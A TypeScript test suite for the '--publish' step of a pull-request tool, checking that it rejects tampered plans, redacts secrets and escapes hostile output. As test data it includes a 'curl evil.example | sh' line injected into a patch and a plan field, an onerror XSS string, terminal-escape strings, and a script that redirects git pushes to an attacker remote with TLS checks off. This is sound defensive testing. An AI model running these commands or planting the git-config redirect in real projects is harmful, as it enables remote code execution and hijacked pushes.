import { execFile } from "node:child_process";
import { once } from "node:events";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { cp, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { exitCodeFor, fix, type FixOptions, prose, renderSummary } from "../src/fix.js";
import { git, patch } from "../src/git.js";
import { serializePlan, type Plan } from "../src/plan.js";
import { loadRecords } from "../src/records/load.js";

// A second record with the same rules, so a plan can hold two changes.
vi.mock("../src/records/load.js", async (original) => {
  const real = await original<typeof import("../src/records/load.js")>();
  const loadRecords = async (dir?: string) => {
    const all = await real.loadRecords(dir);
    const max = all.find((l) => l.record.id === "openai:2024-09-12:max-tokens-to-max-completion-tokens")!;
    return [...all, { ...max, record: { ...max.record, id: "openai:2024-09-12:max-tokens-copy", title: "The same rename, again" } }];
  };
  return { ...real, loadRecords };
});

const exec = promisify(execFile);
const PACKS = fileURLToPath(new URL("../packs/", import.meta.url));
const BEFORE = join(PACKS, "openai", "2024-09-12-max-tokens-to-max-completion-tokens", "fixtures", "basic", "before");
const MAX = "openai:2024-09-12:max-tokens-to-max-completion-tokens";
const COPY = "openai:2024-09-12:max-tokens-copy";
const BRANCHES = ["darnit/openai-max-tokens-to-max-completion-tokens", "darnit/openai-max-tokens-copy"];
const SORTED = [...BRANCHES].sort();
const TOKEN = "ghp_fake0123456789abcdefghijklmnopqrstuv";
const REPORTED = "Build and test results were reported by the verify job. This job ran none of the repository's code: darnit made the change again on the same commit and checked it is the one verified.\n\n";
const ids = new Set((await loadRecords()).map((l) => l.record.id));

const tempDirs: string[] = [];
const temp = async (prefix: string) => {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
};
afterEach(async () => {
  vi.unstubAllGlobals();
  vi.unstubAllEnvs();
  await Promise.all(tempDirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});
beforeEach(() => {
  for (const k of ["GITHUB_TOKEN", "GH_TOKEN", "SSH_AUTH_SOCK", "GITHUB_ACTIONS", "GITHUB_SHA"]) vi.stubEnv(k, "");
});

const commit = (dir: string, message: string) => git(dir, ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", message]);

/** A repository from `files` on top of the fixture, pushed to a local bare remote. */
async function origin(files: Record<string, string> = {}): Promise<{ dir: string; bare: string; branch: string }> {
  const dir = await temp("darnit-job1-");
  await cp(BEFORE, dir, { recursive: true });
  for (const [name, text] of Object.entries(files)) await writeFile(join(dir, name), text);
  await git(dir, ["init", "-q"]);
  await git(dir, ["add", "."]);
  await commit(dir, "init");
  const bare = await temp("darnit-origin-");
  await git(bare, ["init", "-q", "--bare"]);
  await git(dir, ["remote", "add", "origin", bare]);
  const branch = (await git(dir, ["symbolic-ref", "--short", "HEAD"])).trim();
  await git(dir, ["push", "-q", "-u", "origin", branch], 60);
  return { dir, bare, branch };
}

/** The write job's checkout: a fresh clone of the remote. */
async function fresh(bare: string): Promise<string> {
  const dir = join(await temp("darnit-job2-"), "repo");
  await exec("git", ["clone", "-q", bare, dir]);
  return dir;
}

/** Runs --prepare with no token, as the verify job does, and returns the plan's folder. */
async function prepare(dir: string, opts: FixOptions = { test: "node -e 1" }): Promise<string> {
  const plan = join(await temp("darnit-plan-"), "plan");
  await fix(dir, { prepare: plan, version: "t", ...opts });
  return plan;
}

const readPlan = async (plan: string) => JSON.parse(await readFile(join(plan, "plan.json"), "utf8")) as Plan;
const writePlan = (plan: string, value: Plan) => writeFile(join(plan, "plan.json"), serializePlan(value, ids));

function stubGitHub(base: string) {
  const posts: Record<string, string>[] = [];
  vi.stubEnv("GITHUB_TOKEN", TOKEN);
  vi.stubGlobal("fetch", (url: string, init?: RequestInit): Promise<Response> => {
    const body = (data: unknown, status = 200) => Promise.resolve(new Response(JSON.stringify(data), { status }));
    if (url.endsWith("/repos/o/r")) return body({ default_branch: base });
    if (url.includes("/pulls?")) return body([]);
    posts.push(JSON.parse(init?.body as string) as Record<string, string>);
    return body({ html_url: `https://github.com/o/r/pull/${posts.length}` }, 201);
  });
  return posts;
}

const publish = (dir: string, plan: string, opts: FixOptions = {}) => fix(dir, { publish: plan, repo: "o/r", version: "t", ...opts });
const branches = async (bare: string) => (await git(bare, ["branch", "--list", "darnit/*", "--format=%(refname:short)"])).split("\n").filter(Boolean).sort();
const treeOf = async (bare: string, branch: string) => (await git(bare, ["rev-parse", `${branch}^{tree}`])).trim();

const cli = (cwd: string, env: NodeJS.ProcessEnv, ...args: string[]) =>
  new Promise<{ code: number; stdout: string; stderr: string }>((resolve) =>
    execFile(
      process.execPath,
      ["--import", import.meta.resolve("tsx"), fileURLToPath(new URL("../src/cli.ts", import.meta.url)), ...args],
      { cwd, env: { ...process.env, DARNIT_NO_UPDATE_CHECK: "1", GITHUB_ACTIONS: "", GITHUB_TOKEN: "", GH_TOKEN: "", SSH_AUTH_SOCK: "", ...env } },
      (err, stdout, stderr) => resolve({ code: err ? ((err as { code?: number }).code ?? 1) : 0, stdout, stderr }),
    ),
  );

describe("fix --publish", () => {
  it("opens one pull request per change in the plan, with the branches and bodies --pr makes", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir);
    expect((await readPlan(plan)).groups.map((g) => g.id)).toEqual([MAX, COPY]);
    const job2 = await fresh(bare);
    const posts = stubGitHub(branch);
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr)).toMatchObject([1, 2].map((n) => ({ state: "opened", url: `https://github.com/o/r/pull/${n}`, tests: { passed: true } })));
    expect(exitCodeFor(result)).toBe(0);
    expect(renderSummary(result)).toContain("pull request opened https://github.com/o/r/pull/1\n  tests: node -e 1 passed");
    expect(posts.map((p) => p.head)).toEqual(BRANCHES);
    expect(posts[0]!.body).toContain(`## Verified\n${REPORTED}- [x] \`node -e 1\` passed`);
    expect(await branches(bare)).toEqual(SORTED);
    expect((await git(job2, ["status", "--porcelain"])).trim()).toBe("");
    const published = await Promise.all(BRANCHES.map((b) => treeOf(bare, b)));
    const messages = await Promise.all(BRANCHES.map((b) => git(bare, ["log", "-1", "--format=%B", b])));

    // --pr in the verify job's checkout, for the same commit, pushes the same content with the same body but that line.
    for (const b of BRANCHES) await git(bare, ["branch", "-D", b]);
    const pr = stubGitHub(branch);
    expect((await fix(dir, { pr: true, repo: "o/r", version: "t", test: "node -e 1" })).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    expect(await Promise.all(BRANCHES.map((b) => treeOf(bare, b)))).toEqual(published);
    expect(await Promise.all(BRANCHES.map((b) => git(bare, ["log", "-1", "--format=%B", b])))).toEqual(messages);
    expect(pr.map((p) => p.body)).toEqual(posts.map((p) => p.body!.replace(REPORTED, "")));
  });

  it("publishes from the command line with the token in its environment, against a local API", async () => {
    const { dir, bare, branch } = await origin();
    // The command line loads darnit's real records only.
    const plan = await prepare(dir);
    const value = await readPlan(plan);
    await writePlan(plan, { ...value, groups: value.groups.filter((g) => g.id === MAX) });
    const posts: Record<string, string>[] = [];
    const auth: (string | undefined)[] = [];
    const server = createServer((req, res) => {
      auth.push(req.headers.authorization);
      let data = "";
      req.on("data", (c: Buffer) => (data += c.toString()));
      req.on("end", () => {
        if (req.method === "POST") posts.push(JSON.parse(data) as Record<string, string>);
        const reply = req.url === "/repos/o/r" ? { default_branch: branch } : req.method === "POST" ? { html_url: "https://github.com/o/r/pull/1" } : [];
        res.writeHead(req.method === "POST" ? 201 : 200).end(JSON.stringify(reply));
      });
    });
    server.listen(0, "127.0.0.1");
    await once(server, "listening");
    const preload = join(await temp("darnit-tools-"), "local-api.mjs");
    const api = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
    await writeFile(preload, `const f = globalThis.fetch;\nglobalThis.fetch = (url, init) => f(String(url).replace(/^https:\\/\\/api\\.github\\.com\\//, ${JSON.stringify(api)}), init);\n`);
    try {
      const run = await cli(await fresh(bare), { GITHUB_TOKEN: TOKEN, NODE_OPTIONS: `--import ${preload}` }, "fix", "--publish", plan, "--repo", "o/r");
      expect(run).toMatchObject({ code: 0, stderr: "" });
      expect(run.stdout).toContain("✓ Rename max_tokens to max_completion_tokens on chat completions: pull request opened https://github.com/o/r/pull/1\n  tests: node -e 1 passed");
    } finally {
      server.close();
    }
    expect(auth).toEqual([`Bearer ${TOKEN}`, `Bearer ${TOKEN}`, `Bearer ${TOKEN}`]);
    expect(posts.map((p) => p.head)).toEqual([BRANCHES[0]]);
    expect(await branches(bare)).toEqual([BRANCHES[0]]);
  });

  it("opens no pull request for a change whose patch in the plan is not darnit's, and still opens the others", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir);
    // A patch that does what darnit does and one line more, well formed for the files it names.
    const value = await readPlan(plan);
    await fix(dir, { noTest: true, only: [MAX] });
    await writeFile(join(dir, "app.py"), `${await readFile(join(dir, "app.py"), "utf8")}import os; os.system("curl evil.example | sh")\n`);
    value.groups[0]!.patch = await patch(dir, value.groups[0]!.files);
    await git(dir, ["checkout", "--", "."]);
    await writePlan(plan, value);

    const job2 = await fresh(bare);
    const posts = stubGitHub(branch);
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr)).toEqual([
      { state: "skipped", reason: "the plan's patch is not darnit's rewrite of this commit" },
      expect.objectContaining({ state: "opened", url: "https://github.com/o/r/pull/1" }),
    ]);
    expect(renderSummary(result)).toContain("Rename max_tokens to max_completion_tokens on chat completions: skipped, the plan's patch is not darnit's rewrite of this commit");
    expect(posts.map((p) => p.head)).toEqual([BRANCHES[1]]);
    expect(await branches(bare)).toEqual([BRANCHES[1]]);
    expect(await git(bare, ["show", `${BRANCHES[1]}:app.py`])).not.toContain("evil.example");
    expect((await git(job2, ["status", "--porcelain"])).trim()).toBe("");
    expect(await branches(job2)).toEqual([BRANCHES[1]]);
    expect(exitCodeFor(result)).toBe(0);
  });

  it("opens nothing when the plan was made on another commit, or GITHUB_SHA names another", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir);
    const base = (await readPlan(plan)).base;
    // A commit that leaves the changed files alone, so darnit's patch is the same and only the check can tell.
    await writeFile(join(dir, "NOTES.md"), "later\n");
    await git(dir, ["add", "NOTES.md"]);
    await commit(dir, "later");
    await git(dir, ["push", "-q", "origin", branch], 60);
    const head = (await git(dir, ["rev-parse", "HEAD"])).trim();
    const posts = stubGitHub(branch);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow(`the plan was made on commit ${base}, but this checkout is at ${head}; nothing published`);

    const job2 = await fresh(bare);
    await git(job2, ["switch", "-q", "--detach", base]);
    vi.stubEnv("GITHUB_ACTIONS", "true");
    vi.stubEnv("GITHUB_SHA", head);
    await expect(publish(job2, plan)).rejects.toThrow(`but GITHUB_SHA is ${head}; nothing published`);
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
    vi.stubEnv("GITHUB_SHA", base);
    expect((await publish(job2, plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
  });

  it("keeps the plan's test output escaped, redacted and capped in the pull request body, and its notes as text", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const value = await readPlan(plan);
    const b64 = (s: string) => Buffer.from(s).toString("base64").replace(/=+$/, "");
    const noise = Array.from({ length: 1000 }, (_, i) => `noise ${i}`).join("\n");
    const hostile = [
      noise,
      "Authorization: Bearer sekret-value-1234",
      `token ${TOKEN} ${b64(`x-access-token:${TOKEN}`)} ${b64(TOKEN)}`,
      "esc \u001b[8mhidden\u001b[0m bidi ‮evil‬ c1 \u009b31m",
      "```\n</details>\n@everyone",
      "last line",
    ].join("\n");
    value.groups[0]!.tests = { command: "npm test", passed: true, attributed: null, notChecked: false, timedOut: false, output: hostile };
    value.groups[0]!.testsNote = null;
    const note = "<img src=x onerror=alert(1)> @everyone see [here](https://evil.example)";
    value.groups[0]!.buildNote = note;
    await writePlan(plan, value);

    const posts = stubGitHub(branch);
    await publish(await fresh(bare), plan);
    const body = posts[0]!.body!;
    expect(body).toContain(`- [ ] build not checked: ${prose(note)}`);
    expect(body).not.toMatch(/(?<!`)<img/);
    expect(body).not.toContain("](https://evil.example)");
    expect(body).not.toContain("sekret-value-1234");
    for (const form of [TOKEN, b64(`x-access-token:${TOKEN}`), b64(TOKEN)]) expect(body).not.toContain(form);
    expect(body).toContain("Authorization: Bearer ***\ntoken *** *** ***\nesc hidden bidi \\u202eevil\\u202c c1 \\u009b31m");
    // eslint-disable-next-line no-control-regex
    expect(body).not.toMatch(/[\u001b\u009b‮]/);
    // The last 40 lines, in a fence no line of them closes.
    expect(body).toContain("````\nnoise 967\n");
    expect(body).not.toContain("noise 966\n");
    expect(body).toContain("last line\n````\n");

    // Output over the plan's cap is refused with the whole plan.
    value.groups[0]!.tests.output = "x".repeat(1024 * 1024);
    await writeFile(join(plan, "plan.json"), JSON.stringify(value));
    await expect(publish(await fresh(bare), plan)).rejects.toThrow("tests.output: over the cap of 16384 characters");
    expect(posts).toHaveLength(2);
  });

  it("pushes to the remote it was cloned from, when the verify job's code redirected that job's git config", async () => {
    // The repository's tests write config that sends darnit's push elsewhere: a URL rewrite, and the
    // DNS override with TLS checks off that would do the same for github.com.
    const evil = await temp("darnit-attacker-");
    await git(evil, ["init", "-q", "--bare"]);
    const redirect = `const { execSync } = require("node:child_process");
const origin = execSync("git remote get-url origin", { encoding: "utf8" }).trim();
execSync(\`git config url.${evil}.insteadOf \${origin}\`);
execSync("git config http.curloptResolve github.com:443:127.0.0.1");
execSync("git config http.sslVerify false");
`;
    const { dir, bare, branch } = await origin({ "package.json": JSON.stringify({ scripts: { test: "node redirect.cjs" } }), "redirect.cjs": redirect });

    // --pr runs the tests in the job that pushes, so the push goes where they say.
    stubGitHub(branch);
    expect((await fix(dir, { pr: true, repo: "o/r", only: [MAX] })).records[0]?.pr?.state).toBe("opened");
    expect(await branches(evil)).toEqual([BRANCHES[0]]);
    expect(await branches(bare)).toEqual([]);
    await git(evil, ["branch", "-D", BRANCHES[0]!]);

    // --prepare runs them in a job of its own; --publish, on a fresh clone, runs nothing of the repository's.
    const job1 = await fresh(bare);
    vi.stubEnv("GITHUB_TOKEN", "");
    const plan = await prepare(job1, {});
    expect(await git(job1, ["config", "--local", "--get-regexp", "^url\\."])).toContain(evil);
    expect((await readPlan(plan)).groups[0]?.tests).toMatchObject({ command: "npm test", passed: true });
    const job2 = await fresh(bare);
    const posts = stubGitHub(branch);
    const result = await publish(job2, plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
    expect(posts).toHaveLength(2);
    expect(await branches(bare)).toEqual(SORTED);
    expect(await branches(evil)).toEqual([]);
    await expect(git(job2, ["config", "--local", "--get-regexp", "^(url\\.|http\\.)"])).rejects.toBeDefined();
  });

  it("reports a change the plan says failed with the plan's result, and opens no pull request for it", async () => {
    const { dir, bare } = await origin();
    const breaks = "node -e \"process.exit(require('fs').readFileSync('app.js','utf8').includes('max_completion_tokens') ? 1 : 0)\"";
    const plan = await prepare(dir, { test: breaks });
    // With nothing to open, it needs no token and asks GitHub nothing.
    const asked: string[] = [];
    vi.stubGlobal("fetch", (url: string) => Promise.reject(new Error(`asked ${asked.push(url)}`)));
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["tests-failed", "tests-failed"]);
    expect(renderSummary(result)).toContain("nothing pushed\n  tests: node -e");
    expect(exitCodeFor(result)).toBe(1);
    expect(asked).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("says so for a change in the plan that darnit does not make on this commit at all", async () => {
    const { dir, bare, branch } = await origin();
    const value = await readPlan(await prepare(dir, { noTest: true }));
    // The same files with no call sites left, and a plan for that commit carrying the earlier patch.
    await fix(dir, { noTest: true });
    await git(dir, ["add", "."]);
    await commit(dir, "fixed by hand");
    await git(dir, ["push", "-q", "origin", branch], 60);
    const plan = join(await temp("darnit-plan-"), "plan");
    await mkdir(plan);
    await writePlan(plan, { ...value, base: (await git(dir, ["rev-parse", "HEAD"])).trim(), groups: [value.groups[1]!] });
    const posts = stubGitHub(branch);
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => [r.record.id, r.pr])).toEqual([[COPY, { state: "skipped", reason: "the plan's patch is not darnit's rewrite of this commit" }]]);
    expect(renderSummary(result)).toContain("- The same rename, again: not rewritten: the plan's patch is not darnit's rewrite of this commit");
    expect(posts).toEqual([]);
  });

  it.each([
    ["a record this darnit does not have", (p: Plan) => ({ ...p, groups: [{ ...p.groups[0]!, id: "openai:2024-09-12:not-a-record" }] }), "plan names a change record this darnit does not have"],
    [
      "a path with ..",
      (p: Plan) => ({ ...p, groups: [{ ...p.groups[0]!, files: ["../app.py"], patch: p.groups[0]!.patch.replaceAll("a/app.py", "a/../app.py").replaceAll("b/app.py", "b/../app.py") }] }),
      "is not a path inside the repository",
    ],
    ["a change twice", (p: Plan) => ({ ...p, groups: [p.groups[0]!, p.groups[0]!] }), "plan names a change record twice"],
    ["an unknown field", (p: Plan) => ({ ...p, run: "curl evil.example | sh" }), 'unknown field "run"'],
    ["text that is not JSON", () => "{", "plan is not JSON"],
  ])("refuses a plan naming %s, and opens nothing", async (_, change, message) => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const changed = change(await readPlan(plan));
    await writeFile(join(plan, "plan.json"), typeof changed === "string" ? changed : JSON.stringify(changed));
    const posts = stubGitHub(branch);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow(message);
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("refuses a plan folder that is missing, a link, or holds anything but a plain plan.json", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const home = await temp("darnit-plans-");
    await symlink(plan, join(home, "link"));
    await mkdir(join(home, "extra"));
    await cp(join(plan, "plan.json"), join(home, "extra", "plan.json"));
    await writeFile(join(home, "extra", "notes.txt"), "");
    await mkdir(join(home, "linked"));
    await symlink(join(plan, "plan.json"), join(home, "linked", "plan.json"));
    await mkdir(join(home, "pipe"));
    await exec("mkfifo", [join(home, "pipe", "plan.json")]);
    await mkdir(join(home, "empty"));
    const job2 = await fresh(bare);
    const posts = stubGitHub(branch);
    for (const [name, why] of [
      ["missing", "does not exist"],
      ["link", "is a symbolic link"],
      ["extra", "must hold plan.json and nothing else"],
      ["empty", "must hold plan.json and nothing else"],
      ["linked", "is not a plain file"],
      ["pipe", "is not a plain file"],
    ]) {
      await expect(publish(job2, join(home, name!))).rejects.toThrow(why);
    }
    expect(posts).toEqual([]);
    expect((await publish(job2, plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
  });

  it("refuses --prepare, --pr, --dry-run, --only, --test and --no-test alongside it", async () => {
    const { dir } = await origin();
    const plan = await prepare(dir, { noTest: true });
    for (const [opts, message] of [
      [{ prepare: plan }, "--publish and --prepare can't be combined"],
      [{ pr: true }, "--publish and --pr can't be combined"],
      [{ dryRun: true }, "--publish and --dry-run can't be combined"],
      [{ only: [MAX] }, "--publish and --only can't be combined"],
      [{ test: "node -e 1" }, "--publish and --test can't be combined"],
      [{ noTest: true }, "--publish and --no-test can't be combined"],
    ] as [FixOptions, string][]) {
      await expect(publish(dir, plan, opts)).rejects.toThrow(message);
    }
    for (const [args, message] of [
      [["--publish", plan, "--pr"], "--publish and --pr can't be combined"],
      [["--publish", ""], "--publish needs the folder that holds the plan"],
      [["--publish", "--json"], "--publish needs the folder that holds the plan"],
      [["--publish", join(plan, "nowhere")], "does not exist; give --publish the folder --prepare wrote"],
    ]) {
      const run = await cli(dir, {}, "fix", ...args!);
      expect(run.code).toBe(2);
      expect(run.stderr).toContain(message);
    }
  });
});
